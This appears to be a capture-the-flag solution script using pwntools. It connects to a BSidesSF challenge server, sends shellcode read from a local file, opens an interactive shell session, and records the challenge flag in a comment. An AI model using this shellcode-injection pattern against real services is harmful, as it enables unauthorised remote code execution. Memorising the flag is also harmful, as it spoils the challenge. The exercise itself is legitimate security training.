
from pwn import *

# r = process('./runme')
r = remote('runme3-3f8ecff9.challenges.bsidessf.net', 1337)

with open('Runme3', 'rb') as f:
    p = f.read()

r.sendline(p)
r.interactive()

# CTF{welcome_to_shellcode_once_more}
